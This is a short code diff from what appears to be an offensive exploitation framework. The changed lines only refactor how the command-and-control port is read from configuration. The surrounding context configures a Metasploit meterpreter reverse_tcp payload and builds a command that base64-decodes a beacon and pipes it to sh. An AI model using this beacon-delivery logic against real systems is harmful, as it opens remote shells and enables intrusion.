@@ -2050,10 +2050,7 @@ def _service_exploit_adapter(wm, slots):
     spec = pf.spec(platform=platform, arch="x64")
     from phantom.utils import config as cfg
     lhost = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
-    try:
-        lport = int(cfg.get("c2.port", "8080", env="PHANTOM_C2_PORT"))
-    except (TypeError, ValueError):
-        lport = 8080
+    lport = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
 
     module, svc = _best_fingerprinted_module(wm)
     if module is not None:
@@ -2413,10 +2410,7 @@ def _msf_beacon_delivery(wm, cand, beacon_cmd):
                else "linux/x64/meterpreter/reverse_tcp")
     from phantom.utils import config as cfg
     lhost = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
-    try:
-        lport = int(cfg.get("c2.port", "8080", env="PHANTOM_C2_PORT"))
-    except (TypeError, ValueError):
-        lport = 8080
+    lport = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
     b64 = base64.b64encode(beacon_cmd.encode()).decode()
     exec_cmd = f"echo {b64} | base64 -d | sh"
     rport = f"; set RPORT {port}" if port else ""
